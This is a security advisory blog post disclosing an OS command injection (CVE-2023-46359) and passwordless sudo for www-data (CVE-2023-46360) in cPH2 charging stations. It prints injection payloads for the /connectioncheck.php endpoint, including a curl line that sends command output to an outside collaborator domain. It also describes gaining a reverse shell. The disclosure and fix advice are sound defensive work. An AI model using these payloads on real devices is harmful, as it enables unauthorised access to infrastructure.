




<!DOCTYPE html>
<html lang="en" class="no-js">
<head>
  <title>
    
      
        OS Command Injection in cPH2 Charging Station &lt;2.0.0 (CVE-2023-46359 and CVE-2023-46360) | Offensity
      
    
  </title>
  <meta name="description" content="
    Security reports: efficient and straightforward. The simplest way to detect and fix vulnerabilities
    ">

  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1">

  

<link rel="icon"                             href="/static/img/favicons/favicon.b40bcf662e92.ico"       type="image/png" >
<link rel="icon"             sizes="32x32"   href="/static/img/favicons/favicon-32x32.c04ea7432641.png" type="image/png">
<link rel="icon"             sizes="16x16"   href="/static/img/favicons/favicon-16x16.1b9f9ac10ab2.png" type="image/png">
<link rel="apple-touch-icon" sizes="180x180" href="/static/img/favicons/apple-touch-icon.d4292be8229c.png">

<link rel="mask-icon" href="/static/img/favicons/safari-pinned-tab.a6b1f8bf6958.svg" color="#5bbad5">
<meta name="msapplication-TileColor" content="#2b5797">
<meta name="theme-color" content="#ffffff">


  
    

<meta property="og:image" content="https://www.offensity.com/static/img/2022/main-hero-image.b0185c5d2276.png" />
<meta property="og:title" name="title" content="
  
    
      OS Command Injection in cPH2 Charging Station &lt;2.0.0 (CVE-2023-46359 and CVE-2023-46360) | Offensity
    
  
">


  

  <link href="/static/css/helper-webflow.1c0c27591bcf.css" rel="stylesheet">
  <link href="/static/css/normalize.25b2e0265584.css" rel="stylesheet">
  <link href="/static/css/webflow.f4371e634c74.css" rel="stylesheet">
  <link href="/static/css/offensity.webflow.11401112c5de.css" rel="stylesheet">

  
  <link href="/static/css/pages.77be530408bb.css" rel="stylesheet">


  <link rel="canonical" href="https://www.offensity.com/en/blog/os-command-injection-in-cph2-charging-station-200-cve-2023-46359-and-cve-2023-46360/">

  
  
</head>
<body class="blog-page body">

  <!-- Google Tag Manager (noscript) -->
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-ND88VML"
height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<!-- End Google Tag Manager (noscript) -->

  

  
    
  

  
    





<div data-animation="over-right" data-collapse="medium" data-duration="400" data-easing="ease" data-easing2="ease"
     role="banner" class="navbar w-nav">
  <div class="navbar-container w-container">
    <div class="navbar-wrapper">
      <a href="/en/" title="offensity.com/en/" aria-current="page"
         class="brand w-nav-brand w--current"><img
        src="/static/img/2022/offensity-logo.a280f1ac3bd0.svg" loading="lazy" alt="logo" class="logo-image"></a>
      <nav role="navigation" class="nav-menu w-nav-menu">
        <div class="close-menu w-nav-button"><img src="/static/img/2022/mobile-close-icon.4e1cdcd5d2cd.svg" loading="lazy"
                                                  alt="close"></div>
        <div class="links-wrapper">
          
          
          
          
          
          
          
          
          
          
          
          
          
          
          



  
    
      <a href="/en/solution/"
         class="nav-link w-nav-link">
        Solution
      </a>
    
  

  
    
      <a href="/en/pricing/"
         class="nav-link w-nav-link">
        Pricing
      </a>
    
  

  
    
      <a href="/en/demo/" target="_blank"
         class="nav-link w-nav-link">
        Demo
      </a>
    
  

  


        </div>
        <div class="nav-buttons mobile">
          <div class="lang-wrapper">
            <a href="/de/"
               class=" lang-switcher ">DE</a>
            <a href="/en/"
               class=" lang-switcher w--current ">EN</a>
          </div>
          
            <a href="https://reporting.offensity.com" class="default-button margin-right w-button">
              Offensity Login ↗
            </a>
          
          <a href="/en/signup/" class="default-button style-2 w-button">Get it free</a>
        </div>
      </nav>
      <div class="nav-buttons">
        <a href="/de/"
           class=" lang-switcher ">DE</a>
        <a href="/en/"
           class=" lang-switcher w--current ">EN</a>
        
          <a href="https://reporting.offensity.com" class="default-button margin-right w-button">
            Offensity Login ↗
          </a>
        
        



      <a href="/en/try-offensity-for-free/"
         class="default-button style-2 w-button">
        Try for free
      </a>



      </div>
      <div class="menu-button-2 w-nav-button"><img src="/static/img/2022/mobile-burger-menu.0fe3faa0a176.svg" loading="lazy"
                                                   width="30" alt="burger-menu"></div>
    </div>
  </div>
</div>

  

  

  <div class="hero-section-champaign wf-section">
    <div class="container-default w-container">
      <h1 class="heading">OS Command Injection in cPH2 Charging Station &lt;2.0.0 (CVE-2023-46359 and CVE-2023-46360)</h1>
      <p class="hero-text mt-15">
        
          <strong>Ewen Coppens, Dec. 14, 2023</strong>
          </p>
    </div>

  </div>



  <main role="main" class="body">
    
  
    <div class="container-default w-container">
      <div class="block-paragraph_block"><p data-block-key="yv33q">During a web application penetration test for one of our clients we identified an OS Command Injection in the <b>cPH2</b> charging station produced by eCharge Hardy Barth GmbH.</p>
</div>
<div class="block-paragraph_block"><p data-block-key="jl42d">The cPH2 charging station comes with a web interface where an administrator can monitor and manage real time usage, charge logs, firmware update as well as configuration settings.</p>
</div>
<div class="block-image_block">
  <figure>
    






<img alt=""
     src="https://sos-at-vie-1.exo.io/offensity-www-media/images/config_interface.width-320.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=EXO62529db2da36e4e9a10b1db6%2F20250111%2Fat-vie-1%2Fs3%2Faws4_request&amp;X-Amz-Date=20250111T171328Z&amp;X-Amz-Expires=3600&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=dff2fbc485a32b260aea8ff3d425f42b7e39ed3babf3da926a81a7974fb8543e"
     sizes="100vw" class="full-width"

   srcset="https://sos-at-vie-1.exo.io/offensity-www-media/images/config_interface.width-320.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=EXO62529db2da36e4e9a10b1db6%2F20250111%2Fat-vie-1%2Fs3%2Faws4_request&amp;X-Amz-Date=20250111T171328Z&amp;X-Amz-Expires=3600&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=dff2fbc485a32b260aea8ff3d425f42b7e39ed3babf3da926a81a7974fb8543e 320w,
           https://sos-at-vie-1.exo.io/offensity-www-media/images/config_interface.width-640.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=EXO62529db2da36e4e9a10b1db6%2F20250111%2Fat-vie-1%2Fs3%2Faws4_request&amp;X-Amz-Date=20250111T171328Z&amp;X-Amz-Expires=3600&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=1ec418a756965b27aea2f1ea37502ca850c19fa4eeebced28721ff2266bcadfb 640w,
           https://sos-at-vie-1.exo.io/offensity-www-media/images/config_interface.width-930.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=EXO62529db2da36e4e9a10b1db6%2F20250111%2Fat-vie-1%2Fs3%2Faws4_request&amp;X-Amz-Date=20250111T171328Z&amp;X-Amz-Expires=3600&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=cc162ac30ec2682f789a8b21066408d3563a5ad5f5639edc13b089eefe76a75b 930w">

    <figcaption>Configuration Page</figcaption>
  </figure>
</div>
<div class="block-paragraph_block"><p data-block-key="joeq4">The vulnerable PHP page is not visible in the user interface, but an inspection of the page source unveiled the existence of the &quot;<b>/connectioncheck.php</b>&quot; endpoint, which takes an <b>IP</b> address as a parameter. Initially designed to assess connectivity to the provided IP, likely through a ping command, this endpoint may be susceptible to <b>OS Command Injection</b>.</p>
</div>
<div class="block-image_block">
  <figure>
    






<img alt=""
     src="https://sos-at-vie-1.exo.io/offensity-www-media/images/vulnerable_endpoint_in_source_code.width-320.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=EXO62529db2da36e4e9a10b1db6%2F20250111%2Fat-vie-1%2Fs3%2Faws4_request&amp;X-Amz-Date=20250111T171328Z&amp;X-Amz-Expires=3600&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=098df2ed88bb422a619a97a5b1f1781f6b5ca09b071e20be8612ccaf3dc01be5"
     sizes="100vw" class="full-width"

   srcset="https://sos-at-vie-1.exo.io/offensity-www-media/images/vulnerable_endpoint_in_source_code.width-320.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=EXO62529db2da36e4e9a10b1db6%2F20250111%2Fat-vie-1%2Fs3%2Faws4_request&amp;X-Amz-Date=20250111T171328Z&amp;X-Amz-Expires=3600&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=098df2ed88bb422a619a97a5b1f1781f6b5ca09b071e20be8612ccaf3dc01be5 320w,
           https://sos-at-vie-1.exo.io/offensity-www-media/images/vulnerable_endpoint_in_source_code.width-640.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=EXO62529db2da36e4e9a10b1db6%2F20250111%2Fat-vie-1%2Fs3%2Faws4_request&amp;X-Amz-Date=20250111T171328Z&amp;X-Amz-Expires=3600&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=2e87b8c4f7641b2763633970aad3a24518fbb9c6307caabe74bbe0563122020a 640w,
           https://sos-at-vie-1.exo.io/offensity-www-media/images/vulnerable_endpoint_in_source_code.width-930.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=EXO62529db2da36e4e9a10b1db6%2F20250111%2Fat-vie-1%2Fs3%2Faws4_request&amp;X-Amz-Date=20250111T171328Z&amp;X-Amz-Expires=3600&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=64542cf6749ee3793bf891e5bf52533599519070c9287e75d6de508cc9aae627 930w">

    <figcaption>Vulnerable endpoint discovered in the page source of /config.php</figcaption>
  </figure>
</div>
<div class="block-paragraph_block"><p data-block-key="joeq4">Using a straightforward payload such as <i>ip=127.0.0.1 &amp;&amp; ${whoami}</i>, the server responds with <i>127.0.0.1 &amp;&amp; ${whoami} =&gt; &lt;b&gt;SUCCESS&lt;/b&gt;</i>. This indicates that the command injection has been successfully executed. However, it is evident that the server is not displaying the output or result of the executed command.</p><p data-block-key="bdgmk"></p><p data-block-key="cap1r">In order to verify that the paylaod is executed and to extract data, we tried an out-of-band payload <i>127.0.0.1 &amp;&amp; curl $(whoami).puna2r96oxpuhbuhki9vvrinkeq5ex2m.examplecollab.com</i> and we received DNS and HTTP request to our burp collaborator for the domain <i>www-data.puna2r96oxpuhbuhki9vvrinkeq5ex2m.examplecollab.com.</i></p>
</div>
<div class="block-image_block">
  <figure>
    






<img alt=""
     src="https://sos-at-vie-1.exo.io/offensity-www-media/images/dns_request_out_of_band.width-320.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=EXO62529db2da36e4e9a10b1db6%2F20250111%2Fat-vie-1%2Fs3%2Faws4_request&amp;X-Amz-Date=20250111T171328Z&amp;X-Amz-Expires=3600&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=1ff6558ae7dd337ce83f5accc9a3cbe4a3e77752da43edd1bda884fb6bec17ca"
     sizes="100vw" class="full-width"

   srcset="https://sos-at-vie-1.exo.io/offensity-www-media/images/dns_request_out_of_band.width-320.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=EXO62529db2da36e4e9a10b1db6%2F20250111%2Fat-vie-1%2Fs3%2Faws4_request&amp;X-Amz-Date=20250111T171328Z&amp;X-Amz-Expires=3600&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=1ff6558ae7dd337ce83f5accc9a3cbe4a3e77752da43edd1bda884fb6bec17ca 320w,
           https://sos-at-vie-1.exo.io/offensity-www-media/images/dns_request_out_of_band.width-640.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=EXO62529db2da36e4e9a10b1db6%2F20250111%2Fat-vie-1%2Fs3%2Faws4_request&amp;X-Amz-Date=20250111T171328Z&amp;X-Amz-Expires=3600&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=e54e8681818054be4ce4bd14e170c4a91907491d9ff7a53273d8225b04e3a8f7 640w,
           https://sos-at-vie-1.exo.io/offensity-www-media/images/dns_request_out_of_band.width-930.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=EXO62529db2da36e4e9a10b1db6%2F20250111%2Fat-vie-1%2Fs3%2Faws4_request&amp;X-Amz-Date=20250111T171328Z&amp;X-Amz-Expires=3600&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=769b02a4e7ccf5d4f0e8c83f9fdaa87cc863838caf893ea7d1190e975ae27da0 930w">

    <figcaption>DNS request received for the domain www-data.puna2r96oxpuhbuhki9vvrinkeq5ex2m.examplecollab.com.</figcaption>
  </figure>
</div>
<div class="block-paragraph_block"><p data-block-key="s8d2h">Having confirmed the successful execution of the payload on the target device, we can now deploy a payload to initiate a reverse shell. This specific OS Command Injection vulnerability is formally identified as <b>CVE-2023-46359</b>.</p>
</div>
<div class="block-image_block">
  <figure>
    






<img alt=""
     src="https://sos-at-vie-1.exo.io/offensity-www-media/images/reverse-shell.width-320.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=EXO62529db2da36e4e9a10b1db6%2F20250111%2Fat-vie-1%2Fs3%2Faws4_request&amp;X-Amz-Date=20250111T171328Z&amp;X-Amz-Expires=3600&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=3fc091f993c85913e2e7a36e02aa1199884767faa5d04304f6d9d1e182731547"
     sizes="100vw" class="full-width"

   srcset="https://sos-at-vie-1.exo.io/offensity-www-media/images/reverse-shell.width-320.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=EXO62529db2da36e4e9a10b1db6%2F20250111%2Fat-vie-1%2Fs3%2Faws4_request&amp;X-Amz-Date=20250111T171328Z&amp;X-Amz-Expires=3600&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=3fc091f993c85913e2e7a36e02aa1199884767faa5d04304f6d9d1e182731547 320w,
           https://sos-at-vie-1.exo.io/offensity-www-media/images/reverse-shell.width-640.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=EXO62529db2da36e4e9a10b1db6%2F20250111%2Fat-vie-1%2Fs3%2Faws4_request&amp;X-Amz-Date=20250111T171328Z&amp;X-Amz-Expires=3600&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=54ecc7f1e1fe11e970e015d7714fc7e5670561517fee5c06db3b233e614f8fc7 640w,
           https://sos-at-vie-1.exo.io/offensity-www-media/images/reverse-shell.width-930.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=EXO62529db2da36e4e9a10b1db6%2F20250111%2Fat-vie-1%2Fs3%2Faws4_request&amp;X-Amz-Date=20250111T171328Z&amp;X-Amz-Expires=3600&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=e9ac8cd33153b1495d1c7f61fa697a6795c55c886a01f6345872cec414f66ba7 930w">

    <figcaption>Reverse shell obtained as www-data</figcaption>
  </figure>
</div>
<div class="block-paragraph_block"><p data-block-key="gosal">As we can see on the screenshot above, the service is currently running under the user context of <i>www-data</i>, and it has been discovered that this user possesses unnecessary privileges, specifically the ability to execute sudo commands without requiring a password. This configuration could pose a security risk, as an attacker with access to the <i>www-data</i> context may exploit these elevated privileges for unauthorized actions on the system. This vulnerability is referenced by as <b>CVE-2023-46360.</b></p>
</div>
<div class="block-paragraph_block"><p data-block-key="732vh">A nuclei template for the <b>CVE-2023-46359</b> can be found on the <a href="https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2023/CVE-2023-46359.yaml">nuclei-templates repository</a>.</p>
</div>
<div class="block-paragraph_block"><p data-block-key="gosal">Both vulnerabilities affect any cPH2 Charging Station version &lt; 2.0.0.<br/> The affected customers are advised to update their system to <a href="http://salia.echarge.de/firmware/">the version 2.0.0 or later</a></p>
</div>

      
      

      
    </div>
  

  </main>

  
    

<div class="section wf-section">
  <div class="container-extra-small w-container">
    <div class="banner tracking-banner">
      <div class="container center-container">
        <div class="row">
          <div class="col-sm-10">
            <p>
              
                This website uses cookies and other technology to customize advertising
                and provide you a more personalized experience. To find out more,
                see our <a href="/en/privacy/">Privacy Policy</a>.
              
            </p>
            <p>
              
                Unless you explicitly allow tracking, your data will not be collected using Google Analytics.
              
            </p>

          </div>
          <div class="col-sm-2">
            <button class="js-tracking-accept default-button style-2 w-button btn-center" >
              Allow tracking</button>
            <button class="js-tracking-deny default-button">
              Do not track</button>
          </div>
        </div>
      </div>
    </div>
  </div>
</div>


  

  
    



<div class="footer-wrapper wf-section">
    <div class="wrap">
      <div class="w-layout-grid footer">
        <a id="w-node-ac901f39-8c9e-5153-0f09-5850d60c738e-d2795924" href="/" class="w-inline-block"><img src="/static/img/2022/offensity-logo-white.2ee1a7096670.svg" loading="lazy" id="w-node-_61e74489-159b-d7fd-84ba-75aed2795927-d2795924" alt="" class="footer-image"></a>
        <div id="w-node-_61e74489-159b-d7fd-84ba-75aed2795928-d2795924" class="footer-grid-column">
          <div id="w-node-_61e74489-159b-d7fd-84ba-75aed2795929-d2795924" class="label w-inline-block">Product</div>
          <a href="/login" class="footer-link">Offensity</a>
        </div>
        




        <div id="w-node-_61e74489-159b-d7fd-84ba-75aed2795931-d2795924" class="footer-grid-column">
          <div id="w-node-_61e74489-159b-d7fd-84ba-75aed279593b-d2795924" class="label w-inline-block">Resources</div>
          <a href="/en/blog/" class="footer-link">Blog</a>
          <a href="/en/faq/" class="footer-link">FAQ</a>
        </div>
        <div id="w-node-_61e74489-159b-d7fd-84ba-75aed2795943-d2795924" class="footer-grid-column">
          <div id="w-node-_61e74489-159b-d7fd-84ba-75aed2795944-d2795924" class="label w-inline-block">About</div>
          <a href="https://a1.digital/" target="_blank" class="footer-link">A1 Digital</a>
          <a href="/en/team" class="footer-link">About Us</a>
        </div>
        <div id="w-node-_61e74489-159b-d7fd-84ba-75aed279594c-d2795924" class="footer-grid-column">
          <div id="w-node-_61e74489-159b-d7fd-84ba-75aed279594d-d2795924" class="label w-inline-block">Germany</div>
          <div class="footer-text">St. Martin Straße 59<br>81669 Munich<br>Germany</div>
        </div>
        <div id="w-node-_61e74489-159b-d7fd-84ba-75aed2795955-d2795924" class="footer-grid-column">
          <div class="label w-inline-block">Austria</div>
          <div class="footer-text">Lassallestraße 9<br>1020 Vienna<br>Austria</div>
        </div>
        <div id="w-node-_61e74489-159b-d7fd-84ba-75aed279595e-d2795924" class="footer-grid-column">
          <div class="label w-inline-block"></div>
          <a href="/en/contact/" class="footer-link">Contact</a>
          <a href="/en/privacy/" class="footer-link">Privacy Policy</a>
          <a href="/en/imprint/" class="footer-link">Imprint</a>
        </div>
      </div>
    </div>
  </div>



  



  <script src="/static/js/vendor/jquery-3.5.1.min.12b69d0ae6c6.js"></script>
  <script src="/static/js/vendor/lottie-player.cfc909dd4bec.js"></script>
  <script src="/static/js/2022/webflow.a821adce20fc.js" async defer></script>
  <script src="/static/js/components/004_signup-combo.0091e42240a0.js"></script>
  <script src="/static/js/components/011_cookie-consent.673a7024175b.js"></script>


</body>


</html>
